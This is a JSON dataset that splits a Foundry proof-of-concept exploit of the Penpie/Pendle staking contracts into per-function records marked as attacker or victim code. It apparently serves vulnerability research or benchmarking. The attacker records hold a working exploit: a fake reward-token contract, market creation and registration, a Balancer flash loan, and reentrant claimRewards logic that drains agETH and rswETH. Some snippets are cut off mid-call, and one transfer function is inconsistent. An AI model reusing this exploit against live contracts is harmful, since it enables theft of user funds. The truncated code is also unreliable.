[
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_671_878 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Penpiexyz_io_exp",
    "source_type": "attacker_contract",
    "function_name": "testPoC_A",
    "original_code": "    function testPoC_A() public {\n        attacker = new Attacker();\n\n        // First tx: 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1\n        attacker.createMarket();\n\n        // To pass `if (lastRewardBlock != block.number) {` of PendleMarketV3 contract\n        vm.roll(block.number + 1);\n\n        // Second tx: 0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5\n        attacker.attack();\n\n        console.log(\"Final balance in agETH :\", IERC20(agETH).balanceOf(address(attacker)));\n        console.log(\"Final balance in rswETH:\", IERC20(rswETH).balanceOf(address(attacker)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "assetInfo",
    "original_code": "    function assetInfo() external view returns (uint8, address, uint8) {\n        return (0, address(this), 8);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() external {\n        address[] memory tokens = new address[](2);\n        tokens[0] = agETH;\n        tokens[1] = rswETH;\n        uint256[] memory amounts = new uint256[](2);\n        saved_bal1 = IERC20(agETH).balanceOf(balancerVault);\n        amounts[0] = saved_bal1;\n        saved_bal2 = IERC20(rswETH).balanceOf(balancerVault);\n        amounts[1] = saved_bal2;\n        Interfaces(balancerVault).flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) public view virtual override returns (uint256) {\n        require(owner != address(0), \"ZERO_ADDRESS\");\n\n        return _balanceOf[owner];\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                         ERC721 APPROVAL STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(uint256 => address) internal _getApproved;\n\n    mapping(address => mapping(address => bool)) internal _isApprovedForAll;\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "claimRewards",
    "original_code": "    function claimRewards(\n        address user\n    ) external returns (uint256[] memory rewardAmounts) {\n        if (claimRewardsCall == 0) {\n            claimRewardsCall++;\n            return new uint256[](0);\n        }\n\n        if (claimRewardsCall == 1) {\n            IERC20(agETH).approve(PendleRouterV4, type(uint256).max);\n            uint256 bal_agETH = IERC20(agETH).balanceOf(address(this));\n\n            {\n                Interfaces.SwapData memory swapData = Interfaces.SwapData(\n                    Interfaces.SwapType.NONE, // SwapType swapType;\n                    address(0), // address extRouter;\n                    \"\", // bytes extCalldata;\n                    false // bool needScale;\n                );\n                Interfaces.TokenInput memory input = Interfaces.TokenInput(\n                    agETH, // address tokenIn;\n                    bal_agETH, // uint256 netTokenIn;\n                    agETH, // address tokenMintSy;\n                    address(0), // address pendleSwap;\n                    swapData\n                );\n                Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "createMarket",
    "original_code": "    function createMarket() external {\n        (address PT, address YT) =\n            Interfaces(PendleYieldContractFactory).createYieldContract(address(this), 1_735_171_200, true);\n        PENDLE_LPT = Interfaces(PendleMarketFactoryV3).createNewMarket(\n            PT, 23_352_202_321_000_000_000, 1_032_480_618_000_000_000, 1_998_002_662_000_000\n        );\n        Interfaces(PendleMarketRegisterHelper).registerPenpiePool(PENDLE_LPT);\n\n        _mint(address(YT), 1 ether);\n\n        Interfaces(YT).mintPY(address(this), address(this));\n\n        uint256 bal = IERC20(PT).balanceOf(address(this));\n\n        IERC20(PT).transfer(PENDLE_LPT, bal);\n\n        _mint(address(PENDLE_LPT), 1 ether);\n\n        Interfaces(PENDLE_LPT).mint(address(this), 1 ether, 1 ether);\n\n        IERC20(PENDLE_LPT).approve(PendleStaking_0x6e79, type(uint256).max);\n\n        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT, 999_999_999_999_999_000);\n    }\n\n    // Second\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() external view override returns (uint8) {\n        return _decimals;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal _totalSupply;\n\n    mapping(address => uint256) internal _balanceOf;\n\n    mapping(address => mapping(address => uint256)) internal _allowance;\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "exchangeRate",
    "original_code": "    function exchangeRate() external view returns (uint256 res) {\n        return 1 ether;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "getRewardTokens",
    "original_code": "    function getRewardTokens() external view returns (address[] memory) {\n        if (PENDLE_LPT == msg.sender) {\n            address[] memory tokens = new address[](2);\n            tokens[0] = PENDLE_LPT_0x6010;\n            tokens[1] = PENDLE_LPT_0x038c;\n            return tokens;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "name",
    "original_code": "    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        address[] memory _markets = new address[](1);\n        _markets[0] = PENDLE_LPT;\n        Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(_markets, 0);\n\n        Interfaces(MasterPenpie).multiclaim(_markets);\n        Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x6010, saved_bal);\n        uint256 bal_this = IERC20(PENDLE_LPT_0x6010).balanceOf(address(this));\n\n        IERC20(PENDLE_LPT_0x6010).approve(PendleRouterV4, bal_this);\n\n        {\n            Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(\n                address(0), // address limitRouter;\n                0, // uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise\n                new Interfaces.FillOrderParams[](0), // FillOrderParams[] normalFills;\n                new Interfaces.FillOrderParams[](0), // FillOrderParams[] flashFills;\n                \"\" // bytes optData;\n            );\n\n            Interfaces.SwapData memory swapData = Interfaces.SwapData(\n                Interfaces.SwapType.NONE, // SwapType swapType;\n                address(0), // address extRouter;\n                \"\", // bytes extCalldata;\n                false // bool needScale;\n            );\n\n            Interfaces.TokenOutput memory output = Interfaces.TokenOutput(\n                agETH, //address tokenOut;\n                0, //uint256 minTokenOut;\n                agETH, //address tokenRedeemSy;\n                address(0), //address pendleSwap;\n                swapData //SwapData swapData;\n            );\n\n            Interfaces(PendleRouterV4).removeLiquiditySingleToken(\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "rewardIndexesCurrent",
    "original_code": "    function rewardIndexesCurrent() external returns (uint256[] memory) {}\n\n    uint256 claimRewardsCall;\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[to] += amount;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "addLiquiditySingleTokenKeepYt",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "batchHarvestMarketRewards",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "createNewMarket",
    "original_code": "    function createNewMarket(\n        address PT,\n        int256 scalarRoot,\n        int256 initialAnchor,\n        uint80 lnFeeRateRoot\n    ) external returns (address market);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "createYieldContract",
    "original_code": "    function createYieldContract(\n        address SY,\n        uint32 expiry,\n        bool doCacheIndexSameBlock\n    ) external returns (address PT, address YT) {\n        if (MiniHelpers.isTimeInThePast(expiry) || expiry % expiryDivisor != 0) revert Errors.YCFactoryInvalidExpiry();\n\n        if (getPT[SY][expiry] != address(0)) revert Errors.YCFactoryYieldContractExisted();\n\n        IStandardizedYield _SY = IStandardizedYield(SY);\n\n        (, , uint8 assetDecimals) = _SY.assetInfo();\n\n        string memory syCoreName = _stripSYPrefix(_SY.name());\n        string memory syCoreSymbol = _stripSYPrefix(_SY.symbol());\n\n        PT = Create2.deploy(\n            0,\n            bytes32(block.chainid),\n            abi.encodePacked(\n                type(PendlePrincipalToken).creationCode,\n                abi.encode(\n                    SY,\n                    PT_PREFIX.concat(syCoreName, expiry, \" \"),\n                    PT_PREFIX.concat(syCoreSymbol, expiry, \"-\"),\n                    assetDecimals,\n                    expiry\n                )\n            )\n        );\n\n        YT = BaseSplitCodeFactory._create2(\n            0,\n            bytes32(block.chainid),\n            abi.encode(\n                SY,\n                PT,\n                YT_PREFIX.concat(syCoreName, expiry, \" \"),\n                YT_PREFIX.concat(syCoreSymbol, expiry, \"-\"),\n                assetDecimals,\n                expiry,\n                doCacheIndexSameBlock\n            ),\n            ytCreationCodeContractA,\n            ytCreationCodeSizeA,\n            ytCreationCodeContractB,\n            ytCreationCodeSizeB\n        );\n\n        IPPrincipalToken(PT).initialize(YT);\n\n        getPT[SY][expiry] = PT;\n        getYT[SY][expiry] = YT;\n        isPT[PT] = true;\n        isYT[YT] = true;\n\n        emit CreateYieldContract(SY, expiry, PT, YT);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "depositMarket",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "harvestMarketReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address receiver,\n        uint256 netSyDesired,\n        uint256 netPtDesired\n    ) external nonReentrant notExpired returns (uint256 netLpOut, uint256 netSyUsed, uint256 netPtUsed) {\n        MarketState memory market = readState(msg.sender);\n        PYIndex index = YT.newIndex();\n\n        uint256 lpToReserve;\n\n        (lpToReserve, netLpOut, netSyUsed, netPtUsed) = market.addLiquidity(\n            netSyDesired,\n            netPtDesired,\n            block.timestamp\n        );\n\n        // initializing the market\n        if (lpToReserve != 0) {\n            market.setInitialLnImpliedRate(index, initialAnchor, block.timestamp);\n            _mint(address(1), lpToReserve);\n        }\n\n        _mint(receiver, netLpOut);\n\n        _writeState(market);\n\n        if (_selfBalance(SY) < market.totalSy.Uint())\n            revert Errors.MarketInsufficientSyReceived(_selfBalance(SY), market.totalSy.Uint());\n        if (_selfBalance(PT) < market.totalPt.Uint())\n            revert Errors.MarketInsufficientPtReceived(_selfBalance(PT), market.totalPt.Uint());\n\n        emit Mint(receiver, netLpOut, netSyUsed, netPtUsed);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "mintPY",
    "original_code": "    function mintPY(\n        address receiverPT,\n        address receiverYT\n    ) external nonReentrant notExpired updateData returns (uint256 amountPYOut) {\n        address[] memory receiverPTs = new address[](1);\n        address[] memory receiverYTs = new address[](1);\n        uint256[] memory amountSyToMints = new uint256[](1);\n\n        (receiverPTs[0], receiverYTs[0], amountSyToMints[0]) = (receiverPT, receiverYT, _getFloatingSyAmount());\n\n        uint256[] memory amountPYOuts = _mintPY(receiverPTs, receiverYTs, amountSyToMints);\n        amountPYOut = amountPYOuts[0];\n    }\n\n    /// @notice Tokenize SY into PT + YT for multiple receivers. See `mintPY()` for more details\n    function mintPYMulti(\n        address[] calldata receiverPTs,\n        address[] calldata receiverYTs,\n        uint256[] calldata amountSyToMints\n    ) external nonReentrant notExpired updateData returns (uint256[] memory amountPYOuts) {\n        uint256 length = receiverPTs.length;\n\n        if (length == 0) revert Errors.ArrayEmpty();\n        if (receiverYTs.length != length || amountSyToMints.length != length) revert Errors.ArrayLengthMismatch();\n\n        uint256 totalSyToMint = amountSyToMints.sum();\n        if (totalSyToMint > _getFloatingSyAmount())\n            revert Errors.YieldContractInsufficientSy(totalSyToMint, _getFloatingSyAmount());\n\n        amountPYOuts = _mintPY(receiverPTs, receiverYTs, amountSyToMints);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "multiclaim",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "pools",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "redeemRewards",
    "original_code": "    function redeemRewards(address user) external nonReentrant returns (uint256[] memory) {\n        return _redeemRewards(user);\n    }\n\n    /// @notice returns the list of reward tokens\n",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "registerPenpiePool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "removeLiquiditySingleToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Interfaces",
    "source_type": "victim_contract",
    "function_name": "withdrawMarket",
    "original_code": "",
    "description": ""
  }
]